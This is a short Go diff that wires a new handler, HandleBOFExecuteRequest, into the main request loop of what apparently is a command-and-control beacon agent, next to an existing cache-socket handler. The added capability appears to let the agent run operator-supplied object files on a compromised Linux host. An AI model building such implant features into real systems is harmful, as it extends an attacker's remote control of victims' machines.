@@ -193,6 +193,11 @@ func main() {
 			continue
 		}
 
+		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
+			continue
+		}
+
 		if err := handleCacheSocketRequest(beacon, agentID, &mu, &builder); err != nil {
 			client_utils.HandleError(beacon, "cachesocket", err)
 			continue
